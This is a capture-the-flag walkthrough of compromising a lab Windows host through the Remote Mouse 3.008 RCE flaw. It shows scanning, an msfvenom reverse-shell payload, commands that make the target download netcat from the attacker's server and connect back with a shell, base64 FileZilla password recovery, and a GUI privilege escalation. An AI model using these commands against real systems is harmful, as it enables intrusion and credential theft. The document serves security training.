# CTF Writeup: Mice

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.242.199
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 09:36 EST
Nmap scan report for 192.168.242.199
Host is up (0.026s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE        VERSION
1978/tcp open  remotemouse    Emote Remote Mouse
1979/tcp open  unisql-java?
1980/tcp open  pearldoc-xact?
3389/tcp open  ms-wbt-server  Microsoft Terminal Services
| ssl-cert: Subject: commonName=Remote-PC
| Not valid before: 2025-08-25T10:09:25
|_Not valid after:  2026-02-24T10:09:25
|_ssl-date: 2025-11-09T14:39:44+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REMOTE-PC
|   NetBIOS_Domain_Name: REMOTE-PC
|   NetBIOS_Computer_Name: REMOTE-PC
|   DNS_Domain_Name: Remote-PC
|   DNS_Computer_Name: Remote-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2025-11-09T14:39:16+00:00
7680/tcp open  pando-pub?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (92%), Microsoft Windows 10 1909 - 2004 (85%), Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   27.25 ms 192.168.45.1
2   27.22 ms 192.168.45.254
3   29.14 ms 192.168.251.1
4   29.18 ms 192.168.242.199

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.30 seconds
```

Searched up for public exploits for Emote Remote Mouse application.

```
searchsploit Emote Remote Mouse  
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Hosting Controller 0.6.1 - User Registration (1)                                               | windows/remote/979.txt
Hosting Controller 0.6.1 Hotfix 1.4 - Directory Browsing                                       | windows/remote/675.txt
Hosting Controller 1.x/6.1 - Multiple Information Disclosure Vulnerabilities                   | windows/remote/25194.txt
Micorosft Internet Explorer - SetMouseCapture Use-After-Free (Metasploit)                      | windows/remote/28682.rb
Microsoft Internet Explorer 5.0.1 - Mouse Event URI Status Bar Obfuscation                     | windows/remote/25095.txt
Microsoft Internet Explorer 5.0.1 - Popup.show Mouse Event Hijacking                           | windows/remote/24266.txt
Microsoft Internet Explorer 6 < 10 - Mouse Tracking                                            | windows/remote/23321.txt
Mini Mouse 9.2.0 - Remote Code Execution                                                       | windows/webapps/49743.py
Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)                                             | windows/remote/51010.py
Mozilla Browser 1.5 - URI MouseOver Obfuscation                                                | multiple/remote/23433.txt
Remote Mouse 4.002 - Unquoted Service Path                                                     | windows/local/50258.txt
Remote Mouse GUI 3.008 - Local Privilege Escalation                                            | windows/local/50047.txt
RemoteMouse 3.008 - Arbitrary Remote Command Execution                                         | windows/remote/46697.py
TOTOLINK Routers - Backdoor / Remote Code Execution                                            | hardware/webapps/37770.txt
uzbl 'uzbl-core' - '@SELECTED_URI' Mouse Button Bindings Command Injection                     | linux/remote/34426.txt
WiFi Mouse 1.7.8.5 - Remote Code Execution                                                     | windows/remote/49601.py
WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                                                 | windows/remote/50972.py
WiFi Mouse 1.8.3.2 - Remote Code Execution (RCE)                                               | windows/remote/51072.py
WiFiMouse 1.8.3.4 - Remote Code Execution (RCE)                                                | windows/remote/51016.sh
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Searched up for exploit poc's on github.

Found one and downloaded the exploit on local machine.

```
wget https://raw.githubusercontent.com/p0dalirius/RemoteMouse-3.008-Exploit/refs/heads/master/RemoteMouse-3.008-Exploit.py
```

Created revshell payload.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=1337 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
```

Started up python server in the directory, in which the revshell payload is stored.

```
python3 -m http.server 80
```

Ran the command as described in the README.md of the GitHub Repo.

```
python3 RemoteMouse-3.008-Exploit.py -t 192.168.242.199 -v --cmd 'powershell -c "curl http://192.168.45.166/nc.exe -o C:/Windows/Temp/nc.exe"'
```

The shell.exe got downloaded onto the target system.

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.242.199 - - [09/Nov/2025 09:55:29] "GET /shell.exe HTTP/1.1" 200 -
```

Started up listener on port 80

```
nc -lvnp 80
```

Let's execute it now!

```
python3 RemoteMouse-3.008-Exploit.py --target-ip 192.168.242.199 -v --cmd 'powershell -c "C:/Windows/Temp/nc.exe 192.168.45.166 80 -e cmd"'
```

Note: Non-default ports got probably blocked by firewall, it's important to utilize port 80.

Gained RCE as user "divine".

```
nc -lvnp 80  
retrying local 0.0.0.0:80 : Address already in use
retrying local 0.0.0.0:80 : Address already in use
listening on [any] 80 ...
connect to [192.168.45.166] from (UNKNOWN) [192.168.242.199] 55898
Microsoft Windows [Version 10.0.19042.1348]
(c) Microsoft Corporation. All rights reserved.

C:\Users\divine>
```

Retrieved local.txt in C:\Users\divine\Desktop

```
e5d07adda57104f77cd5f7074a6cce4b
```

When we used Searchsploit to search for exploits for the application, there was an Privilege Escalation Method aswell. Which utilizes Windows GUI to get administrator shell. We can therefore utilize RDP, but we are still missing the password for the divine user. I then searched up for the password & found an base64 encoded password inside C:\Users\divine\AppData\Roaming\FileZilla\recentservers.xml

```
<Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>
```

Decoded password

```
echo "Q29udHJvbEZyZWFrMTE" | base64 -d      
ControlFreak11
```

Logged into RDP with remote-pc\divine:ControlFreak11

```
rdesktop 192.168.242.199 -u divine -p ControlFreak11
```

Let's analyze the priv esc exploit!

```
# Exploit Title: Remote Mouse GUI 3.008 - Local Privilege Escalation
# Exploit Author: Salman Asad (@deathflash1411) a.k.a LeoBreaker
# Date: 17.06.2021
# Version: Remote Mouse 3.008
# Tested on: Windows 10 Pro Version 21H1
# Reference: https://deathflash1411.github.io/blog/cve-2021-35448
# CVE: CVE-2021-35448

Steps to reproduce:

1. Open Remote Mouse from the system tray
2. Go to "Settings"
3. Click "Change..." in "Image Transfer Folder" section
4. "Save As" prompt will appear
5. Enter "C:\Windows\System32\cmd.exe" in the address bar
6. A new command prompt is spawned with Administrator privileges
```



```

```
